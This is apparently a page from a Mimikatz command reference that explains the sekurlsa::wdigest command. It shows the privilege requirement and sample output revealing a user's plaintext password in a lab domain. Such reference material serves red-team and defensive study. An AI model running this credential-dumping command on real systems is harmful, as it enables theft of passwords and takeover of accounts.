# wdigest

`sekurlsa::wdigest` lists WDigest credentials. According to Microsoft, [WDigest.dll](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778868\(v%3dws.10\)) was introduced in the Windows XP operating system. The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges, as documented in RFCs [2617](https://datatracker.ietf.org/doc/html/rfc2617) and [2831](https://datatracker.ietf.org/doc/html/rfc2831).

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::wdigest

Authentication Id : 0 ; 135255778 (00000000:080fd6e2)
Session           : RemoteInteractive from 3
User Name         : m3g9tr0n
Domain            : hacklab
Logon Server      : DC
Logon Time        : 9/27/2021 1:22:05 PM
SID               : S-1-5-21-2725560159-1428537199-2260736313-1730
        wdigest :
         * Username : m3g9tr0n
         * Domain   : hacklab
         * Password : Super_SecretPass1!
```
